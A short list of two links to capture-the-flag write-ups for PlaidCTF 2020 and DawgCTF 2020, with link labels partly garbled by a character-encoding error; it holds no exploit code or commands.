[ã€åŸã€‘PlaidCTF 2020 Writeups â€“ Hatena](https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300)

[ã€åŸã€‘dawgctf-2020-writeups](https://github.com/toomanybananas/dawgctf-2020-writeups/)
